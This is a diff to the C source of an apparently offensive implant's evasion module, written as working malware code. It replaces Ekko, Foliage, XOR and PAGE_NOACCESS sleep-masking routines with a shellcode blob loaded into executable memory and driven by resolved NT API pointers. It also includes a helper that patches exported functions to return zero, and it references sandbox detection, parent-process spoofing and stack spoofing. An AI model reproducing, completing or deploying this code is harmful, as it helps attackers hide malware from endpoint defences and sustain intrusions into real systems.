@@ -3,109 +3,51 @@
 #include <string.h>
 #include <ctype.h>
 #include "evasion.h"
+#include "evasion_pic_ctx.h"
+#include "evasion_pic_bytes.h"
 #include "api_resolve.h"
 
 #ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
 #define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
 #endif
 
-
 /* ─── Compile-time sleep mask mode ────────────────────────────────────────
  * 0 = none      — plain NtDelayExecution (default; safe for all transports)
- * 1 = xor       — XOR .text during sleep; no page-protection change
- * 2 = noaccess  — XOR .text + PAGE_NOACCESS (naïve; fragile on x64)
+ * 1 = xor       — XOR registered regions during sleep
+ * 2 = noaccess  — XOR + PAGE_NOACCESS
  * 3 = ekko      — timer-queue callbacks; main thread parks in ntdll
  * 4 = foliage   — APC chain on dedicated suspended thread
+ *
+ * All modes share a single pre-compiled PIC shellcode blob
+ * (evasion_pic_bytes.h).  The mode is written into SleepMaskCtx.mode at
+ * runtime so evasion_pic_bytes.h is built once and works for all modes.
  */
 #ifndef AGENT_SLEEP_MASK_MODE
 #define AGENT_SLEEP_MASK_MODE 0
 #endif
 
-/* ── Common typedefs (always compiled) ─────────────────────────────────── */
-typedef BOOL (WINAPI *VProt_t)(LPVOID, SIZE_T, DWORD, PDWORD);
+/* NtDelayExecution typedef — used only for the fallback plain-sleep path */
 typedef LONG (WINAPI *NtDelay_t)(BOOLEAN, PLARGE_INTEGER);
-
-/* ── Ekko-specific typedefs (mode 3) ───────────────────────────────────── */
-#if AGENT_SLEEP_MASK_MODE == 3
-typedef HANDLE(WINAPI *CreateEventA_t)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);
-typedef BOOL  (WINAPI *SetEvent_t)(HANDLE);
-typedef BOOL  (WINAPI *CloseHandle_t)(HANDLE);
-typedef HANDLE(WINAPI *CreateTimerQueue_t)(void);
-typedef BOOL  (WINAPI *CreateTimerQueueTimer_t)(PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG);
-typedef BOOL  (WINAPI *DeleteTimerQueueEx_t)(HANDLE, HANDLE);
-typedef DWORD (WINAPI *WaitForSingleObject_t)(HANDLE, DWORD);
-#endif
-
-/* ── FOLIAGE-specific typedefs (mode 4) ────────────────────────────────── */
-#if AGENT_SLEEP_MASK_MODE == 4
-typedef HANDLE(WINAPI *CreateEventA_t)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);
-typedef BOOL  (WINAPI *SetEvent_t)(HANDLE);
-typedef BOOL  (WINAPI *CloseHandle_t)(HANDLE);
-typedef DWORD (WINAPI *WaitForSingleObject_t)(HANDLE, DWORD);
-typedef LONG  (NTAPI *NtCreateThreadEx_t)(PHANDLE, ACCESS_MASK, PVOID, HANDLE,
-                                           PVOID, PVOID, ULONG, SIZE_T, SIZE_T,
-                                           SIZE_T, PVOID);
-typedef LONG  (NTAPI *NtQueueApcThread_t)(HANDLE, PVOID, PVOID, PVOID, PVOID);
-typedef LONG  (NTAPI *NtAlertResumeThread_t)(HANDLE, PULONG);
-typedef LONG  (NTAPI *NtTestAlert_t)(void);
-#endif
-
-/* ── Globals in .data/.bss — always accessible even when .text is locked ─ */
 static NtDelay_t g_NtDelay = NULL;
-static void     *g_text    = NULL;   /* base of .text section (kept for reference) */
-static SIZE_T    g_tsz     = 0;      /* size of .text section (kept for reference) */
 
-/* External shellcode regions registered for sleep masking.
- * Sleep masking only touches these — NEVER the agent's own .text.
- * (VirtualProtect on own .text triggers Windows debug traps after N cycles.) */
+/* External shellcode regions registered for sleep masking. */
 #define MAX_EVASION_REGIONS 8
 typedef struct { void *base; SIZE_T sz; } EvasionRegion;
 static EvasionRegion g_ev_regions[MAX_EVASION_REGIONS];
 static int           g_ev_count = 0;
 
-#if AGENT_SLEEP_MASK_MODE >= 1
-static VProt_t   g_VProt   = NULL;
-#endif
-
-#if AGENT_SLEEP_MASK_MODE == 3
-static CreateEventA_t          g_CreateEvent           = NULL;
-static SetEvent_t              g_SetEvent              = NULL;
-static CloseHandle_t           g_CloseHandle           = NULL;
-static CreateTimerQueue_t      g_CreateTimerQueue      = NULL;
-static CreateTimerQueueTimer_t g_CreateTimerQueueTimer = NULL;
-static DeleteTimerQueueEx_t    g_DeleteTimerQueueEx    = NULL;
-static WaitForSingleObject_t   g_WaitForSingleObject   = NULL;
-typedef struct {
-    EvasionRegion *regions;
-    int            region_count;
-    HANDLE         event;
-    volatile LONG  encrypted;
-} EkkoCtx;
-static EkkoCtx g_ekko_ctx;
-#endif
-
-#if AGENT_SLEEP_MASK_MODE == 4
-static CreateEventA_t        g_CreateEvent        = NULL;
-static SetEvent_t            g_SetEvent           = NULL;
-static CloseHandle_t         g_CloseHandle        = NULL;
-static WaitForSingleObject_t g_WaitForSingleObject = NULL;
-static NtCreateThreadEx_t    g_NtCreateThreadEx   = NULL;
-static NtQueueApcThread_t    g_NtQueueApcThread   = NULL;
-static NtAlertResumeThread_t g_NtAlertResumeThread = NULL;
-static NtTestAlert_t         g_NtTestAlert        = NULL;
-typedef struct {
-    EvasionRegion *regions;
-    int            region_count;
-    HANDLE         event;
-    DWORD          ms;
-    volatile LONG  encrypted;
-} FoliageCtx;
-static FoliageCtx g_foliage_ctx;
-#endif
-
-/* Count of active pipe-server conn_threads. When > 0, sleep_masked skips the
- * PAGE_NOACCESS step to avoid faulting threads executing in .text. */
+/* Count of active pipe-server conn_threads. When > 0, sleep_masked skips
+ * PAGE_NOACCESS to avoid faulting threads executing in registered regions. */
 static volatile LONG g_conn_thread_count = 0;
+
+/* ── PIC sleep mask runtime state ──────────────────────────────────────── */
+static void        *g_pic_base  = NULL;  /* VirtualAlloc'd RX page */
+static SleepMaskCtx g_pic_ctx;           /* persists across sleep calls */
+
+typedef void (*sleep_fn_t)(SleepMaskCtx *);
+static sleep_fn_t   g_pic_sleep = NULL;  /* → g_pic_ctx.fn_sleep_mask_entry */
+
+typedef void (*fill_fn_t)(SleepMaskCtx *);
 
 void evasion_conn_enter(void) { InterlockedIncrement(&g_conn_thread_count); }
 void evasion_conn_leave(void) { InterlockedDecrement(&g_conn_thread_count); }
@@ -120,8 +62,7 @@ void evasion_register_region(void *base, SIZE_T sz) {
     }
 }
 
-/* ── Startup helpers (run from .text before any sleep masking) ─────────── */
-
+/* ── Startup helper: inline-patch an exported function to ret-0 ─────────── */
 static void patch_fn(const char *mod, const char *sym) {
     HMODULE h = GetModuleHandleA(mod);
     if (!h) h = LoadLibraryA(mod);
@@ -134,20 +75,6 @@ static void patch_fn(const char *mod, const char *sym) {
     if (!VirtualProtect((void*)fn, 3, PAGE_EXECUTE_READWRITE, &old)) return;
     memcpy((void*)fn, p, 3);
     VirtualProtect((void*)fn, 3, old, &old);
-}
-
-static void find_text(void) {
-    HMODULE base = GetModuleHandle(NULL);
-    IMAGE_DOS_HEADER   *dos = (IMAGE_DOS_HEADER*)base;
-    IMAGE_NT_HEADERS   *nt  = (IMAGE_NT_HEADERS*)((BYTE*)base + dos->e_lfanew);
-    IMAGE_SECTION_HEADER *s = IMAGE_FIRST_SECTION(nt);
-    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, s++) {
-        if (memcmp(s->Name, ".text", 5) == 0) {
-            g_text = (BYTE*)base + s->VirtualAddress;
-            g_tsz  = s->Misc.VirtualSize;
-            return;
-        }
-    }
 }
 
 /* ── Sandbox / analysis environment detection ──────────────────────────────
@@ -528,81 +455,80 @@ void evasion_init(void) {
 #endif
 
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    HMODULE k32   = GetModuleHandleA("kernel32.dll");
+
+    /* Keep a direct NtDelayExecution pointer for the fallback sleep path
+     * (used when PIC failed to load). */
     g_NtDelay = (NtDelay_t)GetProcAddress(ntdll, "NtDelayExecution");
 
-#if AGENT_SLEEP_MASK_MODE >= 1
+    /* ── Load PIC sleep mask shellcode into an anonymous RX allocation ────
+     *
+     * The shellcode (evasion_pic_bytes.h) is pre-compiled with -nostdlib so
+     * it contains zero imports and zero .rodata references.  By living in a
+     * VirtualAlloc'd page rather than the PE's .evasn section, Windows never
+     * looks up .pdata for that address range, eliminating the heap-corruption
+     * crash that RtlAddFunctionTable was working around. */
     {
-        HMODULE k32 = GetModuleHandleA("kernel32.dll");
-        g_VProt = (VProt_t)GetProcAddress(k32, "VirtualProtect");
-        find_text();
+        LPVOID pic = VirtualAlloc(NULL, evasion_pic_bin_len,
+                                   MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!pic) goto skip_pic;
 
-#if AGENT_SLEEP_MASK_MODE == 3
-        g_CreateEvent         = (CreateEventA_t)       GetProcAddress(k32, "CreateEventA");
-        g_SetEvent            = (SetEvent_t)           GetProcAddress(k32, "SetEvent");
-        g_CloseHandle         = (CloseHandle_t)        GetProcAddress(k32, "CloseHandle");
-        g_CreateTimerQueue    = (CreateTimerQueue_t)   GetProcAddress(k32, "CreateTimerQueue");
-        g_CreateTimerQueueTimer=(CreateTimerQueueTimer_t)GetProcAddress(k32,"CreateTimerQueueTimer");
-        g_DeleteTimerQueueEx  = (DeleteTimerQueueEx_t) GetProcAddress(k32, "DeleteTimerQueueEx");
-        g_WaitForSingleObject = (WaitForSingleObject_t)GetProcAddress(k32, "WaitForSingleObject");
-#endif /* mode 3 */
+        memcpy(pic, evasion_pic_bin, evasion_pic_bin_len);
 
-#if AGENT_SLEEP_MASK_MODE == 4
-        g_CreateEvent         = (CreateEventA_t)       GetProcAddress(k32,   "CreateEventA");
-        g_SetEvent            = (SetEvent_t)           GetProcAddress(k32,   "SetEvent");
-        g_CloseHandle         = (CloseHandle_t)        GetProcAddress(k32,   "CloseHandle");
-        g_WaitForSingleObject = (WaitForSingleObject_t)GetProcAddress(k32,   "WaitForSingleObject");
-        g_NtCreateThreadEx    = (NtCreateThreadEx_t)   GetProcAddress(ntdll, "NtCreateThreadEx");
-        g_NtQueueApcThread    = (NtQueueApcThread_t)   GetProcAddress(ntdll, "NtQueueApcThread");
-        g_NtAlertResumeThread = (NtAlertResumeThread_t)GetProcAddress(ntdll, "NtAlertResumeThread");
-        g_NtTestAlert         = (NtTestAlert_t)        GetProcAddress(ntdll, "NtTestAlert");
-#endif /* mode 4 */
-    }
-#endif /* mode >= 1 */
-
-#if AGENT_SLEEP_MASK_MODE >= 1
-    /* Register the .evasn section with the Windows SEH unwind machinery so the
-     * exception dispatcher can find a valid RUNTIME_FUNCTION entry for any RIP
-     * inside it.  Without this, Windows treats .evasn functions as leaf frames
-     * and any stack-walk through them (kernel APC dispatch, RtlCaptureContext,
-     * vectored handlers) reads [RSP] as the return address — resulting in the
-     * heap-corruption crash observed at ntdll+0x4ab8.
-     * Production frameworks (Havoc, Sliver, CS) do the same for their
-     * sleep-mask trampolines/custom sections. */
-    {
-        typedef struct {
-            DWORD BeginAddress;
-            DWORD EndAddress;
-            DWORD UnwindInfoAddress;
-        } AGENT_RF;
-        typedef BOOLEAN (WINAPI *RtlAFT_t)(AGENT_RF *, DWORD, DWORD64);
-        /* Minimal UNWIND_INFO: Version=1, Flags=0 (no handler), Prolog=0, Codes=0.
-         * Lives in .rdata so its RVA from the PE base is always valid. */
-        static const BYTE s_uwi[4] = { 0x01, 0x00, 0x00, 0x00 };
-        static AGENT_RF   s_rf;
-        static BOOLEAN    s_aft_done = FALSE;
-        if (!s_aft_done) {
-            HMODULE hSelf = GetModuleHandleA(NULL);
-            IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)hSelf;
-            IMAGE_NT_HEADERS *pnt =
-                (IMAGE_NT_HEADERS *)((BYTE *)hSelf + dos->e_lfanew);
-            IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(pnt);
-            for (WORD isec = 0; isec < pnt->FileHeader.NumberOfSections;
-                 isec++, sec++) {
-                if (memcmp(sec->Name, ".evasn", 6) == 0) {
-                    s_rf.BeginAddress      = sec->VirtualAddress;
-                    s_rf.EndAddress        = sec->VirtualAddress + sec->Misc.VirtualSize;
-                    s_rf.UnwindInfoAddress =
-                        (DWORD)((ULONG_PTR)s_uwi - (ULONG_PTR)hSelf);
-                    RtlAFT_t pfn =
-                        (RtlAFT_t)GetProcAddress(ntdll, "RtlAddFunctionTable");
-                    if (pfn) pfn(&s_rf, 1, (DWORD64)(ULONG_PTR)hSelf);
-                    s_aft_done = TRUE;
-                    break;
-                }
-            }
+        DWORD old = 0;
+        if (!VirtualProtect(pic, evasion_pic_bin_len, PAGE_EXECUTE_READ, &old)) {
+            VirtualFree(pic, 0, MEM_RELEASE);
+            goto skip_pic;
         }
+        g_pic_base = pic;
+
+        /* Zero the context so any unresolved pointers are NULL (= safe
+         * fallback in the PIC: missing fn ptr → skip that mode step). */
+        memset(&g_pic_ctx, 0, sizeof(g_pic_ctx));
+
+        /* Fill all NT / kernel32 function pointers the PIC may need.
+         * We resolve all of them unconditionally; unused ones stay NULL. */
+        g_pic_ctx.NtDelay             = (pic_i64 (*)(pic_i32, pic_i64 *))
+            GetProcAddress(ntdll, "NtDelayExecution");
+        g_pic_ctx.VProt               = (pic_i32 (*)(void *, pic_u64, pic_u32, pic_u32 *))
+            GetProcAddress(k32, "VirtualProtect");
+        g_pic_ctx.NtCreateThreadEx    = (pic_i64 (*)(void **, pic_u64, void *, void *,
+                                                       void *, void *, pic_u64,
+                                                       pic_u64, pic_u64, pic_u64, void *))
+            GetProcAddress(ntdll, "NtCreateThreadEx");
+        g_pic_ctx.NtQueueApcThread    = (pic_i64 (*)(void *, void *, void *, void *, void *))
+            GetProcAddress(ntdll, "NtQueueApcThread");
+        g_pic_ctx.NtAlertResumeThread = (pic_i64 (*)(void *, pic_u32 *))
+            GetProcAddress(ntdll, "NtAlertResumeThread");
+        g_pic_ctx.NtTestAlert         = (pic_i64 (*)(void))
+            GetProcAddress(ntdll, "NtTestAlert");
+        g_pic_ctx.CreateEventA        = (void *(*)(void *, pic_i32, pic_i32, const char *))
+            GetProcAddress(k32, "CreateEventA");
+        g_pic_ctx.SetEvent            = (pic_i32 (*)(void *))
+            GetProcAddress(k32, "SetEvent");
+        g_pic_ctx.CloseH              = (pic_i32 (*)(void *))
+            GetProcAddress(k32, "CloseHandle");
+        g_pic_ctx.WaitForSingleObject = (pic_u32 (*)(void *, pic_u32))
+            GetProcAddress(k32, "WaitForSingleObject");
+        g_pic_ctx.CreateTimerQueue    = (void *(*)(void))
+            GetProcAddress(k32, "CreateTimerQueue");
+        g_pic_ctx.CreateTimerQueueTimer = (pic_i32 (*)(void **, void *, void *, void *,
+                                                         pic_u32, pic_u32, pic_u32))
+            GetProcAddress(k32, "CreateTimerQueueTimer");
+        g_pic_ctx.DeleteTimerQueueEx  = (pic_i32 (*)(void *, void *))
+            GetProcAddress(k32, "DeleteTimerQueueEx");
+
+        /* Compile-time mode → written once; stays in ctx for every sleep. */
+        g_pic_ctx.mode = (pic_u32)AGENT_SLEEP_MASK_MODE;
+
+        /* Call pic_fill_exports (at offset 0 of shellcode) to populate
+         * the fn_* callback addresses with their runtime VAs in the alloc. */
+        ((fill_fn_t)g_pic_base)(&g_pic_ctx);
+
+        /* Cache the main dispatch entry point. */
+        g_pic_sleep = (sleep_fn_t)g_pic_ctx.fn_sleep_mask_entry;
     }
-#endif /* mode >= 1 */
+skip_pic:
 
 #ifdef AGENT_STACK_SPOOF
     init_stack_spoof();
@@ -610,311 +536,36 @@ void evasion_init(void) {
 }
 
 /* ══════════════════════════════════════════════════════════════════════════
- * Sleep masking — all code in .evasn so it runs while .text is locked.
- * All Windows API calls go through function pointers in .data to avoid
- * hitting IAT thunks that would be in the encrypted/inaccessible .text.
+ * sleep_masked — public API called by the agent beacon loop.
  *
- * Mode 0 (none)     — plain NtDelayExecution; zero detection surface.
- * Mode 1 (xor)      — XOR .text bytes then sleep (no page-prot change).
- * Mode 2 (noaccess) — XOR .text + PAGE_NOACCESS; naïve, fragile on x64
- *                     because the exception dispatcher reads .pdata→.text.
- * Mode 3 (ekko)     — timer-queue threads do encrypt/decrypt; main thread
- *                     parks in WaitForSingleObject inside ntdll.
- * Mode 4 (foliage)  — dedicated suspended thread drains an APC chain that
- *                     does encrypt→sleep→decrypt; main thread parks in
- *                     WaitForSingleObject inside ntdll.
- * ══════════════════════════════════════════════════════════════════════════
- */
-
-/* ── Helper: plain fallback sleep — used by all modes on error ─────────── */
-__attribute__((section(".evasn"), noinline))
-static void plain_sleep(DWORD ms) {
-    LARGE_INTEGER t;
-    t.QuadPart = -(LONGLONG)ms * 10000LL;
-    if (g_NtDelay) g_NtDelay(FALSE, &t); else Sleep(ms);
-}
-
-/* ─────────────────────────── MODE 1: XOR only ─────────────────────────── */
-#if AGENT_SLEEP_MASK_MODE == 1
-
-/* XOR all registered external regions (encrypt before sleep, decrypt after).
- * Only compiled in mode 1 — the only mode that uses this helper. */
-__attribute__((section(".evasn"), noinline))
-static void xor_ev_regions(void) {
-    for (int i = 0; i < g_ev_count; i++) {
-        unsigned char *p = (unsigned char*)g_ev_regions[i].base;
-        SIZE_T sz = g_ev_regions[i].sz;
-        if (!p || !sz || !g_VProt) continue;
-        DWORD old;
-        if (!g_VProt(p, sz, PAGE_EXECUTE_READWRITE, &old))
-            if (!g_VProt(p, sz, PAGE_READWRITE, &old)) continue;
-        for (SIZE_T j = 0; j < sz; j++) p[j] ^= 0xA7;
-        g_VProt(p, sz, old, &old);   /* restore original protection */
-    }
-}
-
-__attribute__((section(".evasn"), noinline))
+ * Prepares SleepMaskCtx with the current sleep duration, region list, and
+ * conn_thread count, then calls into the PIC shellcode loaded by
+ * evasion_init().  If the PIC failed to load (VirtualAlloc error at startup),
+ * falls back to a plain NtDelayExecution call.
+ *
+ * The sleep mask logic (XOR, NOACCESS, Ekko, FOLIAGE) lives entirely in the
+ * anonymous VirtualAlloc RX page — no PE section, no .pdata requirement.
+ * ══════════════════════════════════════════════════════════════════════════ */
 void sleep_masked(DWORD ms) {
-    /* XOR-encrypt external regions before sleep, decrypt after.
-     * If no regions registered, this is a plain NtDelayExecution sleep. */
-    xor_ev_regions();
-    plain_sleep(ms);
-    xor_ev_regions();
-}
-
-/* ──────────────────────── MODE 2: PAGE_NOACCESS ───────────────────────── */
-#elif AGENT_SLEEP_MASK_MODE == 2
-
-__attribute__((section(".evasn"), noinline))
-void sleep_masked(DWORD ms) {
-    /* No regions to mask, or connection threads active — plain non-alertable sleep.
-     * This also avoids the stack-local saved_prots[] allocation when g_ev_count==0,
-     * which would make this a non-leaf function in .evasn without a .pdata entry. */
-    if (g_ev_count == 0 || InterlockedOr(&g_conn_thread_count, 0) > 0) {
-        plain_sleep(ms); return;
-    }
-
-    /* XOR + NOACCESS external registered regions; save original protections.
-     * Static avoids stack allocation in .evasn (thread-safe: guarded by g_conn_thread_count). */
-    static DWORD saved_prots[MAX_EVASION_REGIONS];
-    for (int i = 0; i < g_ev_count; i++) {
-        unsigned char *p = (unsigned char*)g_ev_regions[i].base;
-        SIZE_T sz = g_ev_regions[i].sz;
-        saved_prots[i] = PAGE_EXECUTE_READ;
-        if (!p || !sz || !g_VProt) continue;
-        DWORD old;
-        if (!g_VProt(p, sz, PAGE_EXECUTE_READWRITE, &old)) continue;
-        saved_prots[i] = old;
-        for (SIZE_T j = 0; j < sz; j++) p[j] ^= 0xA7;
-        g_VProt(p, sz, PAGE_NOACCESS, &old);
-    }
-
-    plain_sleep(ms);
-
-    /* Restore external regions */
-    for (int i = 0; i < g_ev_count; i++) {
-        unsigned char *p = (unsigned char*)g_ev_regions[i].base;
-        SIZE_T sz = g_ev_regions[i].sz;
-        if (!p || !sz || !g_VProt) continue;
-        DWORD old;
-        if (!g_VProt(p, sz, PAGE_EXECUTE_READWRITE, &old))
-            g_VProt(p, sz, PAGE_READWRITE, &old);
-        for (SIZE_T j = 0; j < sz; j++) p[j] ^= 0xA7;
-        g_VProt(p, sz, saved_prots[i], &old);
-    }
-}
-
-/* ─────────────────────────── MODE 3: EKKO ─────────────────────────────── */
-#elif AGENT_SLEEP_MASK_MODE == 3
-
-__attribute__((section(".evasn"), noinline))
-static VOID CALLBACK ekko_encrypt_cb(PVOID ctx, BOOLEAN unused) {
-    (void)unused;
-    EkkoCtx *c = (EkkoCtx*)ctx;
-    for (int i = 0; i < c->region_count; i++) {
-        unsigned char *p = (unsigned char*)c->regions[i].base;
-        SIZE_T sz = c->regions[i].sz;
-        if (!p || !sz) continue;
-        DWORD old;
-        if (!g_VProt(p, sz, PAGE_EXECUTE_READWRITE, &old)) continue;
-        for (SIZE_T j = 0; j < sz; j++) p[j] ^= 0xA7;
-        g_VProt(p, sz, PAGE_NOACCESS, &old);
-    }
-    InterlockedExchange(&c->encrypted, 1);
-}
-
-__attribute__((section(".evasn"), noinline))
-static VOID CALLBACK ekko_decrypt_cb(PVOID ctx, BOOLEAN unused) {
-    (void)unused;
-    EkkoCtx *c = (EkkoCtx*)ctx;
-    for (int i = 0; i < c->region_count; i++) {
-        unsigned char *p = (unsigned char*)c->regions[i].base;
-        SIZE_T sz = c->regions[i].sz;
-        if (!p || !sz) continue;
-        DWORD old;
-        if (!g_VProt(p, sz, PAGE_EXECUTE_READWRITE, &old))
-            g_VProt(p, sz, PAGE_READWRITE, &old);
-        for (SIZE_T j = 0; j < sz; j++) p[j] ^= 0xA7;
-        g_VProt(p, sz, PAGE_EXECUTE_READ, &old);
-    }
-    InterlockedExchange(&c->encrypted, 0);
-    g_SetEvent(c->event);
-}
-
-__attribute__((section(".evasn"), noinline))
-void sleep_masked(DWORD ms) {
-    if (!g_NtDelay || !g_CreateEvent || !g_SetEvent || !g_CloseHandle ||
-        !g_CreateTimerQueue || !g_CreateTimerQueueTimer ||
-        !g_DeleteTimerQueueEx || !g_WaitForSingleObject)
-        { plain_sleep(ms); return; }
-
-    if (InterlockedOr(&g_conn_thread_count, 0) > 0) { plain_sleep(ms); return; }
-
-    /* No regions to mask — non-alertable sleep prevents APC delivery into
-     * an unregistered .evasn frame (which crashes at ntdll+0x4ab8). */
-    if (g_ev_count == 0) {
-        plain_sleep(ms);
-        return;
-    }
-
-    g_ekko_ctx.regions      = g_ev_regions;
-    g_ekko_ctx.region_count = g_ev_count;
-    g_ekko_ctx.encrypted    = 0;
-    g_ekko_ctx.event        = g_CreateEvent(NULL, FALSE, FALSE, NULL);
-    if (!g_ekko_ctx.event) { plain_sleep(ms); return; }
-
-    HANDLE hQ = g_CreateTimerQueue();
-    if (!hQ) { g_CloseHandle(g_ekko_ctx.event); plain_sleep(ms); return; }
-
-    HANDLE hT1 = NULL, hT2 = NULL;
-    g_CreateTimerQueueTimer(&hT1, hQ, (WAITORTIMERCALLBACK)ekko_encrypt_cb,
-                            &g_ekko_ctx, 0, 0, WT_EXECUTEINTIMERTHREAD);
-    g_CreateTimerQueueTimer(&hT2, hQ, (WAITORTIMERCALLBACK)ekko_decrypt_cb,
-                            &g_ekko_ctx, ms, 0, WT_EXECUTEINTIMERTHREAD);
-
-    DWORD wait_rc = g_WaitForSingleObject(g_ekko_ctx.event, ms + 10000);
-    g_DeleteTimerQueueEx(hQ, (HANDLE)(LONG_PTR)(-1));
-
-    /* Emergency recovery if decrypt callback didn't fire */
-    if (wait_rc != WAIT_OBJECT_0 && InterlockedOr(&g_ekko_ctx.encrypted, 0)) {
-        for (int i = 0; i < g_ekko_ctx.region_count; i++) {
-            unsigned char *p = (unsigned char*)g_ekko_ctx.regions[i].base;
-            SIZE_T sz = g_ekko_ctx.regions[i].sz;
-            if (!p || !sz) continue;
-            DWORD old;
-            if (!g_VProt(p, sz, PAGE_EXECUTE_READWRITE, &old))
-                g_VProt(p, sz, PAGE_READWRITE, &old);
-            for (SIZE_T j = 0; j < sz; j++) p[j] ^= 0xA7;
-            g_VProt(p, sz, PAGE_EXECUTE_READ, &old);
+    if (g_pic_sleep) {
+        /* Snapshot current state into ctx.  The PIC reads these at the start
+         * of each sleep call and does not modify g_ev_regions / g_ev_count. */
+        g_pic_ctx.ms               = (pic_u32)ms;
+        g_pic_ctx.conn_thread_count = (pic_i32)InterlockedOr(&g_conn_thread_count, 0);
+        g_pic_ctx.region_count      = g_ev_count;
+        for (int i = 0; i < g_ev_count; i++) {
+            g_pic_ctx.regions[i].base = g_ev_regions[i].base;
+            g_pic_ctx.regions[i].sz   = (pic_u64)g_ev_regions[i].sz;
         }
+        g_pic_sleep(&g_pic_ctx);
+    } else {
+        /* Fallback: plain non-alertable sleep (PIC not loaded). */
+        LARGE_INTEGER t;
+        t.QuadPart = -(LONGLONG)ms * 10000LL;
+        if (g_NtDelay) g_NtDelay(FALSE, &t);
+        else            Sleep(ms);
     }
-
-    g_CloseHandle(g_ekko_ctx.event);
-    g_ekko_ctx.event = NULL;
 }
-
-/* ─────────────────────────── MODE 4: FOLIAGE ──────────────────────────── */
-#elif AGENT_SLEEP_MASK_MODE == 4
-
-__attribute__((section(".evasn"), noinline))
-static VOID NTAPI foliage_encrypt_apc(PVOID ctx, PVOID a2, PVOID a3) {
-    (void)a2; (void)a3;
-    FoliageCtx *c = (FoliageCtx*)ctx;
-    for (int i = 0; i < c->region_count; i++) {
-        unsigned char *p = (unsigned char*)c->regions[i].base;
-        SIZE_T sz = c->regions[i].sz;
-        if (!p || !sz) continue;
-        DWORD old;
-        if (!g_VProt(p, sz, PAGE_EXECUTE_READWRITE, &old)) continue;
-        for (SIZE_T j = 0; j < sz; j++) p[j] ^= 0xA7;
-        g_VProt(p, sz, PAGE_NOACCESS, &old);
-    }
-    InterlockedExchange(&c->encrypted, 1);
-}
-
-__attribute__((section(".evasn"), noinline))
-static VOID NTAPI foliage_sleep_apc(PVOID ctx, PVOID a2, PVOID a3) {
-    (void)a2; (void)a3;
-    FoliageCtx *c = (FoliageCtx*)ctx;
-    LARGE_INTEGER t;
-    t.QuadPart = -(LONGLONG)c->ms * 10000LL;
-    g_NtDelay(FALSE, &t);
-}
-
-__attribute__((section(".evasn"), noinline))
-static VOID NTAPI foliage_decrypt_apc(PVOID ctx, PVOID a2, PVOID a3) {
-    (void)a2; (void)a3;
-    FoliageCtx *c = (FoliageCtx*)ctx;
-    for (int i = 0; i < c->region_count; i++) {
-        unsigned char *p = (unsigned char*)c->regions[i].base;
-        SIZE_T sz = c->regions[i].sz;
-        if (!p || !sz) continue;
-        DWORD old;
-        if (!g_VProt(p, sz, PAGE_EXECUTE_READWRITE, &old))
-            g_VProt(p, sz, PAGE_READWRITE, &old);
-        for (SIZE_T j = 0; j < sz; j++) p[j] ^= 0xA7;
-        g_VProt(p, sz, PAGE_EXECUTE_READ, &old);
-    }
-    InterlockedExchange(&c->encrypted, 0);
-    g_SetEvent(c->event);
-}
-
-__attribute__((section(".evasn"), noinline))
-static DWORD WINAPI foliage_thread_entry(PVOID arg) {
-    (void)arg;
-    g_NtTestAlert();   /* drain APC queue (encrypt→sleep→decrypt) */
-    return 0;
-}
-
-__attribute__((section(".evasn"), noinline))
-void sleep_masked(DWORD ms) {
-    if (!g_NtDelay || !g_CreateEvent || !g_SetEvent || !g_CloseHandle ||
-        !g_WaitForSingleObject || !g_NtCreateThreadEx ||
-        !g_NtQueueApcThread || !g_NtAlertResumeThread || !g_NtTestAlert)
-        { plain_sleep(ms); return; }
-
-    if (InterlockedOr(&g_conn_thread_count, 0) > 0) { plain_sleep(ms); return; }
-
-    /* No regions to mask — non-alertable sleep prevents APC delivery into
-     * an unregistered .evasn frame (which crashes at ntdll+0x4ab8). */
-    if (g_ev_count == 0) {
-        plain_sleep(ms);
-        return;
-    }
-
-    g_foliage_ctx.regions      = g_ev_regions;
-    g_foliage_ctx.region_count = g_ev_count;
-    g_foliage_ctx.ms           = ms;
-    g_foliage_ctx.encrypted    = 0;
-    g_foliage_ctx.event        = g_CreateEvent(NULL, FALSE, FALSE, NULL);
-    if (!g_foliage_ctx.event) { plain_sleep(ms); return; }
-
-    HANDLE hThread = NULL;
-    LONG status = g_NtCreateThreadEx(
-        &hThread, 0x1FFFFF, NULL,
-        (HANDLE)(LONG_PTR)(-1),
-        foliage_thread_entry, NULL,
-        0x1, 0, 0, 0, NULL);
-    if (status != 0 || !hThread) {
-        g_CloseHandle(g_foliage_ctx.event);
-        plain_sleep(ms);
-        return;
-    }
-
-    g_NtQueueApcThread(hThread, foliage_encrypt_apc, &g_foliage_ctx, NULL, NULL);
-    g_NtQueueApcThread(hThread, foliage_sleep_apc,   &g_foliage_ctx, NULL, NULL);
-    g_NtQueueApcThread(hThread, foliage_decrypt_apc, &g_foliage_ctx, NULL, NULL);
-    g_NtAlertResumeThread(hThread, NULL);
-
-    DWORD wait_rc = g_WaitForSingleObject(g_foliage_ctx.event, ms + 15000);
-    g_CloseHandle(hThread);
-
-    if (wait_rc != WAIT_OBJECT_0 && InterlockedOr(&g_foliage_ctx.encrypted, 0)) {
-        for (int i = 0; i < g_foliage_ctx.region_count; i++) {
-            unsigned char *p = (unsigned char*)g_foliage_ctx.regions[i].base;
-            SIZE_T sz = g_foliage_ctx.regions[i].sz;
-            if (!p || !sz) continue;
-            DWORD old;
-            if (!g_VProt(p, sz, PAGE_EXECUTE_READWRITE, &old))
-                g_VProt(p, sz, PAGE_READWRITE, &old);
-            for (SIZE_T j = 0; j < sz; j++) p[j] ^= 0xA7;
-            g_VProt(p, sz, PAGE_EXECUTE_READ, &old);
-        }
-    }
-
-    g_CloseHandle(g_foliage_ctx.event);
-    g_foliage_ctx.event = NULL;
-}
-
-/* ───────────────────── MODE 0 (default): no masking ───────────────────── */
-#else /* AGENT_SLEEP_MASK_MODE == 0 */
-
-__attribute__((section(".evasn"), noinline))
-void sleep_masked(DWORD ms) {
-    plain_sleep(ms);
-}
-
-#endif /* AGENT_SLEEP_MASK_MODE */
 
